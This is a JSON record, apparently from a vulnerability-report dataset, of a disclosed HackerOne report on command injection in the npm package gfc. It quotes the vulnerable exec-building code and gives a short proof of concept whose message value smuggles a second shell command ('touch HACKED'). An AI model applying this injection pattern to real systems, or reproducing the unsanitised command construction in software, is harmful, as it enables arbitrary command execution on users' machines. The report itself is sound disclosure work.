@@ -1,0 +1,32 @@
+{
+  "reported_to": "Node.js third-party modules",
+  "reported_by": "d3lla ",
+  "title": "[gfc] Command Injection via insecure command formatting",
+  "content": "\nI would like to report a Command Injection issue in the gfc module.\nIt allows to execute arbitrary commands on the victim's PC.\nModule\nmodule name: gfc\nversion: 2.0.2\nnpm page: https://www.npmjs.com/package/gfc\nModule Description\nSimple way to initialize a new git repository in an empty directory, add a file and do a first commit (or skip that part in a directory with files). Useful for unit tests and generators.\nModule Stats\n[15] weekly downloads\nVulnerability\nVulnerability Description\nThe issue occurs because a user input parameter is used inside a command that is executed without any proper sanitization.\nHere's the code which causes the issue:\nCode 1.36 KiB\n1\n2// https://github.com/jonschlinkert/gfc/blob/master/index.js#L80\n3...\n4const cp = require('child_process');\n5...\n6const firstCommit = async(cwd, options, callback) => {\n7    ....\n8    const opts = Object.assign({ cwd: cwd }, options);\n9    ....\n10    .then(async() => {\n11      return await exec(createArgs(opts), execOpts); //<-- options\n12    });\n13...\n14\n15function createArgs(options) {\n16  const opts = Object.assign({}, defaults, options);\n17  const args = ['git init'];\n18  const files = opts.files ? arrayify(opts.files).join(' ') : '.';\n19  let message = opts.message || 'First commit';\n20\n21  if (message[0] !== '\"' && message.slice(-1) !== '\"') {\n22    message = `\"${message}\"`; //<-- injection\n23  }\n24\n25  // backwards compatibility\n26  if (opts.skipCommit === true) {\n27    opts.commit = false;\n28  }\n29\n30  if (opts.forceFile === true || (opts.file !== false && isEmpty(opts.cwd))) {\n31    args.push('touch \"' + opts.file.path + '\"');\n32\n33    if (opts.file.contents) {\n34      args.push('echo \"' + opts.file.contents.toString() + '\" >> ' + opts.file.path);\n35    }\n36  }\n37\n38  if (opts.commit !== false) {\n39    args.push(`git add ${files}`);\n40    args.push(`git commit -m ${message}`);\n41  }\n42\n43  if (typeof opts.remote === 'string' && isGitUrl(opts.remote)) {\n44    args.push(`git remote add origin ${opts.remote}`);\n45\n46    if (opts.push === true) {\n47      args.push('git push --force origin master:master');\n48    }\n49  }\n50\n51  return args.join(' && ');\n52}\nThe arguments options is used to build the command that is passed to the child_process.exec function without any sanitization.\nSteps To Reproduce:\ncreate a directory for testing\nmkdir poc\ncd poc/\nmkdir poc\ncd poc/\ninstall gfc module:\nnpm i gfc\nnpm i gfc\ncreate the following PoC JavaScript file (poc.js):\nCode 130 Bytes\n1\n2const firstCommit = require('gfc');\n3const options = {message: '\"\"; touch HACKED;'};\n4firstCommit('.', options, function(err) {});\n5\nmake sure that the HACKED file does not exist:\nls\nls\nexecute the poc.js file:\nnode poc.js\nnode poc.js\nthe HACKED file is created:\nls\nls\nPatch\nDo not concatenate/format commands using insecure user's input. Always check and sanitize it.\nIn my opinion, it's better to use child_process.execFile or child_process.spawn functions instead of child_process.exec.\nSupporting Material/References:\nOPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\nNODEJS VERSION: v14.1.0\nNPM VERSION: 6.14.5\nWrap up\nI contacted the maintainer to let them know: [N]\nI opened an issue in the related repository: [N]\nThank you for your time.\nbest regards,\nd3lla\nImpact\nCommand Injection on gfc module via insecure command formatting.\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Command Injection - Generic"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1603844760,
+  "report_url": "https://hackerone.com/reports/871071",
+  "is_multi_component": false,
+  "complexity": "LOW",
+  "novelty": "LOW",
+  "vuln_category": "CODE",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": true
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves command injection via insecure command formatting in the gfc module, which is not related to authentication or authorization boundaries within the same application. The proposed methodologies focus on detecting authN/authZ issues by swapping user sessions or resource IDs within the same application context, not command injection vulnerabilities.",
+    "is_detectable": false
+  }
+}
